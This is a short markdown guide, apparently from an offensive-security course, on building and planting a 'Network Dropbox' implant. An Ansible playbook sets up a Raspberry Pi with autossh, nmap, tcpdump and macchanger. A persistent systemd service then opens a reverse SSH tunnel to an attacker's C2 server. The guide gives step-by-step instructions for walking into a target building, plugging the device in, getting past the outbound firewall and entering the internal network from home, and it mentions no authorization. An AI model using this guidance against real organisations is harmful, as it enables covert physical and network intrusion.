# 🔌 The Network Dropbox Implant

Advanced operations often involve physical intrusion. While a BadUSB (Phase 18) requires an unlocked workstation, a **Network Dropbox** only requires a spare Ethernet port (e.g., behind a printer, under a desk, or in a conference room).

A Dropbox is a small, concealed micro-computer (like a Raspberry Pi Zero, NanoPi, or specific Hak5 gear) that acts as a permanent, physical bridgehead into the target's internal network.

## 🍯 The Zencefil Auto-Provisioner (Ansible)

Manually configuring a Raspberry Pi to act as a stealthy implant is error-prone. In the Network_Implants directory, Zencefil Efendi has provided an **Ansible Playbook** that automatically provisions a clean Linux OS into a weaponized Dropbox.

### What the Playbook Does:
1.  **Installs Tactical Tools:** Injects autossh, nmap, tcpdump, and macchanger into the device.
2.  **Generates Keys:** Creates an ED25519 SSH keypair for passwordless authentication.
3.  **Configures AutoSSH:** The core of the implant. It creates a persistent systemd service that constantly tries to reach out to your Command & Control (C2) server and establish a **Reverse SSH Tunnel**.
4.  **Stealth:** Disables IPv6 to prevent accidental routing leaks.

### How to Provision Your Device:

1. Flash a standard Linux image to your SD card.
2. Ensure the device is connected to your local network and you have its IP address.
3. Install Ansible on your attacking machine.
4. Edit dropbox_setup.yml and update the C2 variables.
5. Run the provisioner:
```bash
ansible-playbook -i "192.168.1.100," -u root -k dropbox_setup.yml
```

### 🥷 Deployment & Operation
1. The script will instruct you to copy the implant's public key to your C2's authorized_keys file. Do this.
2. Walk into the target building. Plug the Dropbox into power and an active Ethernet port.
3. The Dropbox will get an internal IP from the target's DHCP server. 
4. The zencefil-tunnel service will immediately reach out to your C2 server through the target's outbound firewall.
5. Go home, SSH into your C2 server, and type:
```bash
ssh -p 9090 root@localhost
```
*You are now sitting inside the target's network.*
